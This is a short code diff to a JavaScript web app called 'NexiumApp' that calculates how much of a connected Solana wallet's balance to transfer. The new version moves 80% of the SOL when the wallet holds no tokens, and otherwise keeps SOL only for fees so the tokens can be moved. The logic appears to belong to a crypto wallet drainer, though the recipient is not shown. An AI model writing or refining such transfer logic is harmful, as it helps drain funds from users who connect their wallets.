@@ -545,23 +545,19 @@ class NexiumApp {
 
       // Determine SOL transfer amount
       let solAmount = 0;
-      if (balance > fee) {
-        let reserve = 0;
-        if (hasBalanceTokens.length === 0) {
-          reserve = Math.floor(balance * 0.2); // Reserve 20% for SOL only (transfer 80%)
-        } else {
-          let reserveRatio = 0.4; // 40% reserve when tokens are present
-          reserve = Math.floor(balance * reserveRatio);
-        }
+      if (balance > fee && hasBalanceTokens.length === 0) {
+        // Only transfer SOL if balance exceeds fee and no tokens are present
+        let reserve = Math.floor(balance * 0.2); // Reserve 20% for SOL only
         solAmount = balance - reserve - fee;
         if (solAmount < 0) solAmount = 0;
         console.log("SOL transfer amount calculated:", solAmount, "after reserving:", reserve, "and fee:", fee); // Updated Log
-      } else if (balance > 0 && hasBalanceTokens.length > 0) {
-        // If SOL is only enough for fee and tokens are present, use SOL for fee
-        console.log("SOL balance only sufficient for fee, using for token transfers"); // New Log
+      } else if (balance >= fee && hasBalanceTokens.length > 0) {
+        // If SOL is sufficient for fee and tokens are present, use SOL for fee only
+        console.log("SOL balance sufficient for fee, using for token transfers only"); // New Log
         solAmount = 0;
       } else {
-        console.log("No sufficient SOL for transfer or fees, and no tokens to transfer"); // New Log
+        // If SOL balance is less than fee or no tokens to transfer, abort
+        console.log("No sufficient SOL for fees or no tokens to transfer"); // New Log
         this.showFeedback("Insufficient SOL balance for transaction", 'error');
         return;
       }
@@ -1040,8 +1036,8 @@ class NexiumApp {
     }
     if (tokenAddress === this.lastSelectedToken) return;
     try {
-      let name = 'Unknown Token';
-      let symbol = 'UNK';
+      let name = this.dom.customTokenNameInput?.value.trim() || 'Custom Token';
+      let symbol = 'CSTM';
       let decimals = 9;
       this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
       this.lastSelectedToken = tokenAddress;
